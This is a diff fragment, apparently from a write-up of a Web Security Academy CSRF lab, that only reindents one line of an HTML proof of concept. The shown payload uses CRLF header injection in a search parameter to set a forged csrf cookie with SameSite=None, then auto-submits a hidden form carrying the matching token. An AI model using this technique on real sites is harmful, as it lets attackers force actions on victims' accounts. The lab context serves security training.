@@ -148,7 +148,7 @@ Send this request to CSRF POC generator.
       <input type="hidden" name="csrf" value="anytoken" />
       <input type="submit" value="Submit request" />
     </form>
-			<img src="https://0aa7009804198f7480e676da00a90003.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+      <img src="https://0aa7009804198f7480e676da00a90003.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
 </html>
 ```
